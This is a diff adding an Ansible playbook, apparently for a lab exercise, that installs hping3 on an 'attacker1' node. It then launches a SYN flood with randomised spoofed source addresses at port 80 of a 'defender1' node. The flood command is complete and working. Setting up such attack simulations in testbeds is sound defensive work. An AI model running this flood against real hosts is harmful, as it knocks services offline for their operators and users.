@@ -1,0 +1,17 @@
+---
+- name: Simulate a flood attack with Hping3
+  hosts: attacker1      #node1 attacking node2
+  become: yes
+
+  tasks:
+    - name: Install Hping3        #tool used for analyzing TCP/IP packets
+      yum:
+        name: hping3
+        state: present
+
+    - name: Simulate flood attack
+      command: hping3 -S -p 80 -c 50 --flood --rand-source {{ hostvars['defender1']['ansible_host'] }}
+        #this command runs hping3 and sends a flood attack of SYN packets to port 80 of the target.
+      args:
+        executable: /bin/bash
+          #async: 30     allow task to run for a max of 30 secs
